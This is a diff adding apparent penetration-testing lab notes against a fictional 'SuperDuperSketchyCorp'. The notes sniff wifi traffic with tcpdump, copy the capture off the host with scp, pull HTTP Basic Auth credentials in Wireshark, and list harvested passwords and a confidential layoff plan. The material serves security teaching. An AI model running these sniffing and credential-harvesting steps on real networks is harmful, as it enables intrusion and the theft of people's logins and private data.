@@ -150,3 +150,84 @@ Welcome to the team. I'm sure you'll be very happy here.
 Ben-nate Sprec, PhD
 President
 SuperDuperSketchyCorp
+
+
+
+ifconfig
+    eth0      Link encap:Ethernet  HWaddr 94:c6:91:19:bd:80
+            inet addr:141.212.108.230  Bcast:141.212.108.255  Mask:255.255.255.0
+            inet6 addr: 2607:f018:600:4:69f1:3167:118d:58f2/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:a014:2041:c2f0:c6bf/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:69f5:daeb:451a:3ec2/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:d31f:43a5:be7d:c0d9/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:49c7:8cd:cba:5b99/64 Scope:Global
+            inet6 addr: fe80::2026:a0c4:b679:af0f/64 Scope:Link
+            inet6 addr: 2607:f018:600:4:7815:aaca:33d0:ab60/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:3de1:e14:4fe8:80be/64 Scope:Global
+            inet6 addr: 2607:f018:600:4:5080:4ed9:4763:f67f/64 Scope:Global
+            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+            RX packets:22988772 errors:0 dropped:0 overruns:0 frame:0
+            TX packets:5077228 errors:0 dropped:0 overruns:0 carrier:0
+            collisions:0 txqueuelen:1000
+            RX bytes:4369820964 (4.3 GB)  TX bytes:3182739772 (3.1 GB)
+            Interrupt:16 Memory:dc300000-dc320000
+
+    lo        Link encap:Local Loopback
+            inet addr:127.0.0.1  Mask:255.0.0.0
+            inet6 addr: ::1/128 Scope:Host
+            UP LOOPBACK RUNNING  MTU:65536  Metric:1
+            RX packets:5944792 errors:0 dropped:0 overruns:0 frame:0
+            TX packets:5944792 errors:0 dropped:0 overruns:0 carrier:0
+            collisions:0 txqueuelen:1000
+            RX bytes:24473654629 (24.4 GB)  TX bytes:24473654629 (24.4 GB)
+
+    wlan0     Link encap:Ethernet  HWaddr 00:19:d2:f5:66:26
+            inet addr:35.0.28.235  Bcast:35.0.31.255  Mask:255.255.240.0
+            inet6 addr: fe80::6563:b5d7:c5f3:86c7/64 Scope:Link
+            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+            RX packets:5115025 errors:0 dropped:0 overruns:0 frame:0
+            TX packets:1996973 errors:0 dropped:0 overruns:0 carrier:0
+            collisions:0 txqueuelen:1000
+            RX bytes:410061479 (410.0 MB)  TX bytes:633022207 (633.0 MB)
+
+FINDING ADMIN CREDENTIALS
+tcpdump -G 90 -W 1 -i wlan0 -w cap.pcap
+    tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+    Maximum file limit reached: 1
+    45490 packets captured
+    45669 packets received by filter
+    0 packets dropped by kernel
+
+SCP FILE BACK TO LOCAL ADDRESS
+scp -P 47923 kerrywu@superdupersketchycorp.com:/home/kerrywu/tools/cap.pcap /mnt/c/Users/kerry/Desktop
+
+OPEN IN WIRESHARK
+
+FIND HTTP PROTOCOLS WHERE INFO HAS Ok
+
+CHECK PREVIOUS GET REQUEST
+Hypertext Transfer Protocol -> Authorization
+Credentials: mattley:388roxmysocks
+
+LOGGING INTO ADMIN PAGE
+    Announcements
+    Layoffs are coming!
+    Just letting the exec's know, we'll be laying off 30% of the workforce come March. Be sure not to tell the employees until it's time. If this got out, our quarterly projections would drop.
+
+    Remote Office Work now possible
+    We're setting up a remote office in the Bob and Betty Beyster building at the University of Michigan.
+
+    The password to the executive lounge has changed.
+    Please use 'h4ppie8rthDay'.
+
+
+FINDINGS:
+1. Wifi Password
+2. Open Port 22 on 192.168.0.25
+3/4. Login Credentials
+    jsschaf     Bbf2gHeb
+    kerrywu     RDU4MGBv
+5. Admin Credentials 
+    mattley     388roxmysocks
+6. Secret
+    30% layoffs
